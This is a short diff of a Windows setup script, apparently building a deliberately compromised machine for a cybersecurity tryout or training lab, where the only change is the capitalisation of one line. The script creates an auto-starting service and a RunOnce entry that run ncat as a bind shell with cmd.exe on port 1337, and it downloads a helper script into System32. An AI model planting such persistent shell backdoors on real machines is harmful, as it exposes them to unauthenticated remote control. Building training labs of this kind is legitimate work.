@@ -15,7 +15,7 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
 #Start it as an immediate service as well so that the trainee doesn't have to wait for a boot to see the shell
 #New-Service -Name "Cats" -BinaryPathName "cmd.exe /c start C:\Windows\System32\ncat.exe -n -l -p 1337 -e cmd.exe" -DisplayName "Cats" -StartupType Automatic; Start-Service -Name "Cats"
 #Start-Process -FilePath "C:\Windows\System32\ncat.exe" -ArgumentList "-l -p 1337"
-sc create Cats1 binPath= "cmd.exe /c start C:\Windows\System32\ncat.exe -n -l -p 1337 -e cmd.exe" start= auto error= ignore
+sc create Cats1 binpath= "cmd.exe /c start C:\Windows\System32\ncat.exe -n -l -p 1337 -e cmd.exe" start= auto error= ignore
 sc start Cats1
 #Download the bits service helper script
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/bits-service.ps1" -OutFile "C:\Windows\System32\bits-service.ps1"
